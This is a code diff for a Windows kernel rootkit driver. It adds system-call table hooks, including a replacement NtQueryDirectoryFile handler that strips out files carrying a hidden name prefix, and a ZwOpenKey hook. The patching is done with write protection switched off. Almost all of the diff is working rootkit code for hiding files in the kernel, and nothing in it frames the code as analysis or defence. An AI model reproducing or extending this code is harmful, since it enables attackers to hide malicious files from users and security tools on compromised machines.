@@ -31,10 +31,26 @@ extern CHAR masterPrefix[];
 NTQUERYDIRECTORYFILE		OrgNtQueryDirectoryFile = NULL;
 NTCREATEFILE				OrgNtCreateFile;
 NTQUERYSYSTEMINFORMATION	OrgNtQuerySystemInformation = NULL;
+ZWOPENKEY                   OrgZwOpenKey;
 
 BOOLEAN gb_ApisHooked = FALSE;
 
 NTAPI_LIST	g_ApiList = {0};
+
+
+NTSTATUS NewZwQueryDirectoryFile(
+	IN HANDLE hFile,
+	IN HANDLE hEvent OPTIONAL,
+	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
+	IN PVOID IoApcContext OPTIONAL,
+	OUT PIO_STATUS_BLOCK pIoStatusBlock,
+	OUT PVOID FileInformationBuffer,
+	IN ULONG FileInformationBufferLength,
+	IN FILE_INFORMATION_CLASS FileInfoClass,
+	IN BOOLEAN bReturnOnlyOneEntry,
+	IN PUNICODE_STRING PathMask OPTIONAL,
+	IN BOOLEAN bRestartQuery
+);
 
 VOID SetupIndexes()
 {
@@ -73,15 +89,18 @@ VOID HookApis()
 
 		WPOFF();
 		DbgPrint("Hooking SSD table \n");
-
+        __asm int 3
 		// NtCreateFile
 		OrgNtCreateFile	= SYSCALL( g_ApiList.NtCreateFileIndex );
 		SYSCALL( g_ApiList.NtCreateFileIndex ) = HookNtCreateFile;
 
 		// NtQueryDirectoryFile
 		OrgNtQueryDirectoryFile	= SYSCALL( g_ApiList.NtQueryDirectoryFileIndex );
-		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = HookNtQueryDirectoryFile;
+//		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = HookNtQueryDirectoryFile;
+		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = NewZwQueryDirectoryFile;
 
+        OrgZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
+        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
 		// NtQueryDirectoryFile
 //		OrgNtQuerySystemInformation	= SYSCALL( g_ApiList.NtQuerySystemInformationIndex );
 //		SYSCALL( g_ApiList.NtQuerySystemInformationIndex ) = HookNtQuerySystemInformation;
@@ -108,6 +127,7 @@ VOID UnHookApis()
 
 		SYSCALL( g_ApiList.NtCreateFileIndex ) = OrgNtCreateFile;	
 		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = OrgNtQueryDirectoryFile;	
+        SYSTEMSERVICE( ZwOpenKey ) = OrgZwOpenKey;
 //		SYSCALL( g_ApiList.NtQuerySystemInformationIndex ) = OrgNtQuerySystemInformation;
 
 		gb_ApisHooked = FALSE;
@@ -117,6 +137,25 @@ VOID UnHookApis()
 	}
 }
 
+NTSTATUS 
+HookZwOpenKey(
+	PHANDLE phKey,
+	ACCESS_MASK DesiredAccess,
+	POBJECT_ATTRIBUTES ObjectAttributes
+    )
+{
+        int rc;
+//        DbgPrint("Entered HookZwOpenKey\n");
+		/* open the key, as normal */
+        rc=((ZWOPENKEY)(OrgZwOpenKey)) (
+			phKey,
+			DesiredAccess,
+			ObjectAttributes );
+			
+//		DbgPrint("rootkit: ZwOpenKey : rc = %x, phKey = %X\n", rc, *phKey);
+      
+		return rc;
+}
 
 NTSTATUS
 HookNtQuerySystemInformation(
@@ -177,6 +216,85 @@ HookNtQuerySystemInformation(
 		
 	return status;
 }
+//--------------------------------------------------------------------------
+
+
+NTSTATUS NewZwQueryDirectoryFile(
+	IN HANDLE hFile,
+	IN HANDLE hEvent OPTIONAL,
+	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
+	IN PVOID IoApcContext OPTIONAL,
+	OUT PIO_STATUS_BLOCK pIoStatusBlock,
+	OUT PVOID FileInformationBuffer,
+	IN ULONG FileInformationBufferLength,
+	IN FILE_INFORMATION_CLASS FileInfoClass,
+	IN BOOLEAN bReturnOnlyOneEntry,
+	IN PUNICODE_STRING PathMask OPTIONAL,
+	IN BOOLEAN bRestartQuery
+)
+{
+	NTSTATUS rc;
+//	CHAR aProcessName[PROCNAMELEN];                                        
+//		                                                                      
+//	GetProcessName( aProcessName );                                        
+//	DbgPrint("rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);
+
+	rc=OrgNtQueryDirectoryFile(
+			hFile,							/* this is the directory handle */
+			hEvent,
+			IoApcRoutine,
+			IoApcContext,
+			pIoStatusBlock,
+			FileInformationBuffer,
+			FileInformationBufferLength,
+			FileInfoClass,
+			bReturnOnlyOneEntry,
+			PathMask,
+			bRestartQuery);
+
+	if( NT_SUCCESS( rc ) && 
+		(FileInfoClass == FileDirectoryInformation ||
+		 FileInfoClass == FileFullDirectoryInformation ||
+		 FileInfoClass == FileIdFullDirectoryInformation ||
+		 FileInfoClass == FileBothDirectoryInformation ||
+		 FileInfoClass == FileIdBothDirectoryInformation ||
+		 FileInfoClass == FileNamesInformation )
+		) 
+	{
+			PVOID p = FileInformationBuffer;
+			PVOID pLast = NULL;
+			BOOLEAN bLastOne;
+			do 
+			{
+				bLastOne = !getDirEntryLenToNext(p,FileInfoClass);
+				
+				// compare directory-name prefix with '_root_' to decide if to hide or not.
+
+				if (getDirEntryFileLength(p,FileInfoClass) >= 18) {
+					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)&hidePrefixW.Buffer[ 0 ], 18 ) == 18 ) 
+					{
+						if( bLastOne ) 
+						{
+							if( p == FileInformationBuffer ) rc = 0x80000006;
+							else setDirEntryLenToNext(pLast,FileInfoClass, 0);
+							break;
+						} 
+						else 
+						{
+							int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
+							int iLeft = (ULONG)FileInformationBufferLength - iPos - getDirEntryLenToNext(p,FileInfoClass);
+							RtlCopyMemory( p, (PVOID)( (char *)p + getDirEntryLenToNext(p,FileInfoClass) ), (ULONG)iLeft );
+							continue;
+						}
+					}
+				}
+				pLast = p;
+				p = ((char *)p + getDirEntryLenToNext(p,FileInfoClass) );
+			} while( !bLastOne );
+	}
+	return(rc);
+}
+
 
 
 //////////////////////////////////////////////////////////////////////////
@@ -221,26 +339,42 @@ NTSTATUS HookNtQueryDirectoryFile(
 			bReturnOnlyOneEntry,
 			PathMask,
 			bRestartQuery);
+			
+    if (IoApcRoutine!=NULL || hEvent != NULL) {
+       DbgPrint("Leaving for kamikadze ;)\n");
+       return rc;
+    }
+    
 
-	return rc;
+//    DbgPrint("Entered HookNtQueryDirectoryFile\n");
 
 	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
 	currentEprocess = PsGetCurrentProcess();
 	if (IsPriviligedProcess( currentEprocess ) ) {
+        DbgPrint("HookNtQueryDirectoryFile> IsPriviligedProcess == true\n");
 		return rc;
 	}
-
+   
 	if( NT_SUCCESS( rc ) ) 
-	{
-		
+	{		
 		PDirEntry p = (PDirEntry)FileInformationBuffer;
 		PDirEntry pLast = NULL;
 		BOOLEAN bLastOne;
+                 
+       	if ((FileInfoClass != FileDirectoryInformation &&
+		 FileInfoClass != FileFullDirectoryInformation &&
+		 FileInfoClass != FileIdFullDirectoryInformation &&
+		 FileInfoClass != FileBothDirectoryInformation &&
+		 FileInfoClass != FileIdBothDirectoryInformation &&
+		 FileInfoClass != FileNamesInformation ))
+		 return rc;
+         
+
+	    __asm int 3
 		do 
 		{
 			bLastOne = !( p->dwLenToNext );
-			
-			if (p->wNameLen >= 18)
+//			if (p->wNameLen >= 18)
 				if( RtlCompareMemory( (PVOID)&p->suName[ 0 ], (PVOID)&hidePrefixW.Buffer[ 0 ], 18 ) == 18 ) 
 //				if( RtlCompareMemory( (PVOID)&p->suName[ 0 ], (PVOID)&hidePrefixW[ 0 ], 18 ) == 18 ) 
 				{
@@ -290,6 +424,7 @@ NTSTATUS HookNtCreateFile(
 
 	currentEprocess = PsGetCurrentProcess();
 	if (IsPriviligedProcess( currentEprocess ) ) {
+        DbgPrint("HookNtCreateFile> IsPriviligedProcess == true\n");                             
 		goto pass_throught;
 	}
 
